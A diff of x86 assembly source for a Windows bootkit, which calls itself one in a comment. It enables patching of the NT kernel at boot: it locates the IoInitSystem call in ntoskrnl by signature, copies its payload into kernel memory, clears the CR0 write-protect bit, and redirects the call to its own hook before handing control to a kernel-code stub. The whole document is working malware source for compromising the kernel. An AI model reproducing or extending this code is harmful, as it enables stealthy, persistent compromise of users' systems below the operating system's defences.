@@ -264,15 +264,51 @@ jz Exit_FakeImgpLoadPEImage
 
 ; find the signature in ntoskrnl and patch the code
 call Find_Ntoskrnl_Code_Pattern
-;jz Patch_Kernel_Code_Vista   ; if found, patch!
+jz Patch_Kernel_Code_Vista   ; if found, patch!
 Exit_FakeImgpLoadPEImage:
 jmp Obfuscation_Return ; return to Windows
 
 Patch_Kernel_Code_Vista:
+; ebx = some address 
+; ecx = size of image of nt kernel
+; edi = nt kernel image base address
 nop
 nop
+; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
+; remember original jump address
+mov edx,[ebx]  ; edx = [signature], must be some address
+lea edx,[ebx+edx+4]  ; signature address + relative jump address + 4 = return address
+mov [esi+10],edx  ; store return address to temporary code (ntkernel_Hook_Address)
+
+add edi,2048  
+jmp Patch_Kernel_Code
+
+; patch the NT Kernel with Kernel Code  =)
+Patch_Kernel_Code:
+add edi,00000FFFh  ; get end of page
+and edi,0FFFFF000h  ; page base address
+sub edi,2048;
+mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
+push edi
+rep movsb
+pop edi
+
+add edi,Ntoskrnl_Hook_Code - Relocate_Me_Code   ; -> absolute Kernel Code entry point address
+sub edi,ebx    ; - address of call
+sub edi,4  ; -4 because of call instruction, relative call
+mov [ebx],edi    ; store address
+jmp dword Obfuscation_Return
 
 Find_Ntoskrnl_Code_Pattern:
+; Phase1InitializationDiscard
+; INIT:007BF3E0 6A 19                                   push    19h
+; INIT:007BF3E2 6A 4B                                   push    4Bh
+; INIT:007BF3E4 58                                      pop     eax
+; INIT:007BF3E5 E8 C4 6D C4 FF                          call    _InbvSetProgressBarSubset@8 ; InbvSetProgressBarSubset(x,x)
+; INIT:007BF3EA 56                                      push    esi             ; NewIrql
+; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
+; INIT:007BF3F0 84 C0                                   test    al, al
+; INIT:007BF3F2 75 07                                   jnz     short loc_7BF3FB
 ; Input
 ;   ecx = SizeOfImage
 ;   edi = Image
@@ -319,55 +355,6 @@ Find_Ntoskrnl_Code_Pattern_Exit:
 pop edi
 pop ecx
 ret
-
-Obfuscation_Function:
-; [stack + 0] = address to jump to
-; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
-
-; Output:
-; esi = pointer to Relocate_Me_Code
-; edi = pointer to return code of Windows / Argument 2
-
-; during execution all memory access is possible is cr0.wp cleared
-; return by jumping to Obfuscation_Return
-
-pushad   ; +32
-pushfd     ; +4
-cld
-
-; clear cr0.Write Protect flag (to allow writing into read-only user pages)
-mov eax,cr0
-push eax ; +4
-and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
-
-; set parameters and call
-; the pe file header
-xchg ebx,[esp+0x28]   ; ebx = return eip  
-mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
-call dword Get_Current_EIP_0
-Get_Current_EIP_0:
-pop esi ; esi = eip
-sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
-jmp ebx   ; jump
-
-; restore cr0.wp
-Obfuscation_Return:
-pop eax
-mov cr0,eax   ; everything done fine, restore it and give control back to Windows
-
-popfd
-popad
-pop ebx ; exchange the value back
-ret             
-
-Relocate_Me_Code:
-nop
-nop
-nop
-nop
-nop
-nop
-Hook_Address    dd  0
 
 Hook_WinloadExe:
 ; Input
@@ -437,6 +424,92 @@ Hook_WinloadExe_Exit:
 pop edi
 pop ecx
 ret
+
+Relocate_Me_Code:
+nop
+nop
+nop
+nop
+nop
+nop
+Hook_Address    dd  0
+ntkernel_Hook_Address    dd  0
+
+Obfuscation_Function:
+; [stack + 0] = address to jump to
+; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
+
+; Output:
+; esi = pointer to Relocate_Me_Code
+; edi = pointer to return code of Windows / Argument 2
+
+; during execution all memory access is possible is cr0.wp cleared
+; return by jumping to Obfuscation_Return
+
+pushad   ; +32
+pushfd     ; +4
+cld
+
+; clear cr0.Write Protect flag (to allow writing into read-only user pages)
+mov eax,cr0
+push eax ; +4
+and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
+
+; set parameters and call
+; the pe file header
+xchg ebx,[esp+0x28]   ; ebx = return eip  
+mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
+call dword Get_Current_EIP_0
+Get_Current_EIP_0:
+pop esi ; esi = eip
+sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
+jmp ebx   ; jump
+
+; restore cr0.wp
+Obfuscation_Return:
+pop eax
+mov cr0,eax   ; everything done fine, restore it and give control back to Windows
+
+popfd
+popad
+pop ebx ; exchange the value back
+ret   
+
+Ntoskrnl_Hook_Code:
+nop
+nop
+nop
+push dword [esp+0x4]   ; store argument 1 = 0x80087000, from nt!IoInitSystem
+push eax    ; first call = Execute_Kernel_Code
+push eax     ; second call = call to original address
+call dword Obfuscation_Function
+
+; set return obfuscation address to original address that was overwritten (forward the function)
+mov eax,[esi+10]  ; esi = original calling address (that was overwritten by applied patch), PMwPC_Address
+mov [esp+0x2c],eax  ; set return pointer (using the obfuscation return) to the original calling address
+
+; remove hook by reassigning jump address
+mov edi,[esp+0x38] ; edi => return eip from this hook call
+sub eax,edi    ; original calling address - return eip to code (calculate relative original calling address)
+mov [ss:edi-4],eax       ; for every next call: do not call this bootkit
+
+; set return eip of the forwarded function to Execute_Kernel_Code
+lea eax,[esi + Execute_Kernel_Code - Relocate_Me_Code]  ; get address of Execute_Kernel_Code
+mov [esp+0x30],eax      ; and store it as return eip address
+jmp short Obfuscation_Return
+
+Execute_Kernel_Code:
+
+; execute the Kernel Code (original hooked/forwarded initialization function returns here)
+;call Kernel_Code   ; =)
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+ret 4      ; remove the pushed argument (as the original function would have done)
 
 Total_End_of_Binary:
 times 4*1024-($-$$) db 0
